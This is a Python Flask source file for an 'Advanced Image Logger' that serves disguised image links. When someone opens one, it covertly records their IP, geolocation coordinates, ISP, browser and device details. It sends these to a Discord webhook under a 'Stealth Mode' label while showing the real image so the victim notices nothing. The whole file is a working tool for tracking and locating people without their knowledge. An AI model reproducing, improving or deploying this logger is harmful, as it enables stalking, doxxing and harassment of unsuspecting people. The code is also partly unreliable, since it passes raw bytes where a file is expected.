from flask import Flask, request, send_file, redirect
import requests
import datetime
import uuid
import hashlib
import time
import os
from urllib.parse import quote

app = Flask(__name__)

WEBHOOK_URL = os.environ.get('WEBHOOK_URL')

if not WEBHOOK_URL:
    WEBHOOK_URL = None  # Will silently fail if missing

RATE_LIMIT = {}
RATE_LIMIT_WINDOW = 60
MAX_HITS = 5

CDN_PATHS = ["/assets/images/", "/cdn/img/", "/media/2026/", "/uploads/04/", "/static/content/"]

def get_random_cdn_path():
    year = datetime.datetime.now().year
    month = f"{datetime.datetime.now().month:02d}"
    random_hash = hashlib.md5(str(uuid.uuid4()).encode()).hexdigest()[:16]
    filename = f"img-{random_hash}.png"
    base = CDN_PATHS[int(random_hash, 16) % len(CDN_PATHS)]
    return f"{base}{year}/{month}/{filename}"

def is_rate_limited(ip):
    now = time.time()
    if ip not in RATE_LIMIT:
        RATE_LIMIT[ip] = []
    RATE_LIMIT[ip] = [t for t in RATE_LIMIT[ip] if now - t < RATE_LIMIT_WINDOW]
    if len(RATE_LIMIT[ip]) >= MAX_HITS:
        return True
    RATE_LIMIT[ip].append(now)
    return False

def send_to_discord(log_data):
    if not WEBHOOK_URL:
        return
    embed = {
        "title": "🖼️ Advanced Image Logger Hit",
        "color": 0xff00ff,
        "fields": [
            {"name": "IP & Location", "value": f"**IP:** `{log_data['ip']}`\n"
                                               f"**Location:** {log_data.get('city', 'N/A')}, {log_data.get('region', 'N/A')}, {log_data.get('country', 'N/A')}\n"
                                               f"**ISP:** {log_data.get('isp', 'N/A')}\n"
                                               f"**Coords:** {log_data.get('loc', 'N/A')}", "inline": False},
            {"name": "Device & Browser", "value": f"**User-Agent:** ```{log_data['user_agent'][:400]}```\n"
                                                   f"**Platform:** {log_data.get('platform', 'N/A')}\n"
                                                   f"**Language:** {log_data.get('language', 'N/A')}\n"
                                                   f"**Timezone:** {log_data.get('timezone', 'N/A')}", "inline": False},
            {"name": "Screen & Display", "value": f"**Resolution:** {log_data.get('screen', 'N/A')}\n"
                                                   f"**Pixel Ratio:** {log_data.get('pixel_ratio', 'N/A')}\n"
                                                   f"**Color Depth:** {log_data.get('color_depth', 'N/A')}", "inline": True},
            {"name": "Other", "value": f"**Referer:** `{log_data.get('referer', 'N/A')}`\n"
                                       f"**Original Image:** {log_data.get('original_url', 'N/A')}\n"
                                       f"**Time:** {log_data['time']}\n"
                                       f"**Log ID:** `{log_data['log_id']}`", "inline": False}
        ],
        "footer": {"text": "Vercel Serverless • Stealth Mode"}
    }
    try:
        requests.post(WEBHOOK_URL, json={"embeds": [embed]}, timeout=5)
    except:
        pass

def get_ip_info(ip):
    try:
        # Free tier IPinfo (or use ipapi.co, ipgeolocation.io etc.)
        r = requests.get(f"https://ipinfo.io/{ip}/json", timeout=4)
        if r.status_code == 200:
            data = r.json()
            return {
                "city": data.get("city"),
                "region": data.get("region"),
                "country": data.get("country"),
                "loc": data.get("loc"),
                "isp": data.get("org")
            }
    except:
        pass
    return {}

@app.route('/s/<short_code>')
def short_redirect(short_code):
    original_url = request.args.get('u', '')
    return redirect(f"/{short_code[:6]}/{short_code[6:]}?u={quote(original_url)}", code=302)

@app.route('/<path:full_path>')
def serve_image(full_path):
    ip = request.remote_addr or "Unknown"
    if is_rate_limited(ip):
        return send_file('static/pixel.png', mimetype='image/png')

    log_id = str(uuid.uuid4())[:12]
    original_url = request.args.get('u', 'Unknown')
    user_agent = request.headers.get('User-Agent', 'N/A')
    referer = request.headers.get('Referer', 'N/A')

    # Basic fingerprint from headers
    platform = "Unknown"
    if "Windows" in user_agent: platform = "Windows"
    elif "Mac" in user_agent: platform = "macOS"
    elif "Linux" in user_agent: platform = "Linux"
    elif "Android" in user_agent: platform = "Android"
    elif "iPhone" in user_agent or "iPad" in user_agent: platform = "iOS"

    # Get rich IP info
    ip_info = get_ip_info(ip)

    log_data = {
        "log_id": log_id,
        "ip": ip,
        "user_agent": user_agent,
        "referer": referer,
        "original_url": original_url,
        "time": datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S UTC'),
        "platform": platform,
        "language": request.headers.get('Accept-Language', 'N/A'),
        **ip_info
    }

    # Trigger advanced tracking via a second invisible pixel (screen + timezone + more)
    tracking_pixel = f"https://your-project.vercel.app/track?log={log_id}&ip={ip}"

    # First, send the basic log
    send_to_discord(log_data)

    # Proxy the real image if possible
    if original_url.startswith(('http://', 'https://')):
        try:
            headers = {'User-Agent': user_agent}
            resp = requests.get(original_url, headers=headers, timeout=8)
            if resp.status_code == 200 and 'image' in resp.headers.get('Content-Type', ''):
                # Return the real image while the browser also loads the tracking pixel (but we can't force it here)
                return send_file(resp.content, mimetype=resp.headers.get('Content-Type'), download_name=full_path.split('/')[-1])
        except:
            pass

    # Fallback + serve tracking redirect for extra data
    # In practice, the tracking route below will be hit when Discord or browser loads embeds
    return send_file('static/pixel.png', mimetype='image/png')

# New dedicated tracking route for extra fingerprint data (screen, timezone, etc.)
@app.route('/track')
def advanced_track():
    log_id = request.args.get('log', 'unknown')
    ip = request.args.get('ip', 'unknown')

    # Extra data that can be passed via query string from a second image load or JS (if enabled)
    screen = request.args.get('s', 'N/A')      # e.g. 1920x1080
    pixel_ratio = request.args.get('pr', 'N/A')
    color_depth = request.args.get('cd', 'N/A')
    timezone = request.args.get('tz', 'N/A')

    log_data = {
        "log_id": log_id,
        "ip": ip,
        "screen": screen,
        "pixel_ratio": pixel_ratio,
        "color_depth": color_depth,
        "timezone": timezone,
        "time": datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S UTC')
    }

    # You can send a second webhook or combine — for now we send a follow-up embed
    if WEBHOOK_URL:
        try:
            requests.post(WEBHOOK_URL, json={
                "content": f"**Advanced Tracking Data** (ID: {log_id})",
                "embeds": [{"description": f"Screen: {screen}\nPixel Ratio: {pixel_ratio}\nTimezone: {timezone}", "color": 0x00ffff}]
            })
        except:
            pass

    return send_file('static/pixel.png', mimetype='image/png')

# Keep the static pixel
if not os.path.exists('static'):
    os.makedirs('static')
with open('static/pixel.png', 'wb') as f:
    f.write(b'\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x06\x00\x00\x00\x1f\x15\xc4\x89\x00\x00\x00\nIDATx\x9cc\x00\x01\x00\x00\x05\x00\x01\r\n-\xb4\x00\x00\x00\x00IEND\xaeB`\x82')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
